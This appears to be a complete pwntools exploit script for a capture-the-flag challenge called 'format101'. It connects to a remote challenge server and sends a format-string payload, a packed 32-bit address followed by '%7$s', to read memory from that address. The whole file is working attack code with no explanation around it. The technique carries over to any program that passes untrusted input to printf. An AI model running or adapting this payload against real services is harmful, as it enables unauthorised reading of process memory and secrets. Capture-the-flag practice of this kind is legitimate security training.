from pwn import *

# p = process('./format101')
p = remote('plzpwn.me',"9448")
p.recv()
p.sendline('\x60\xa0\x04\x08'+'%7$s')
print(p.recv())
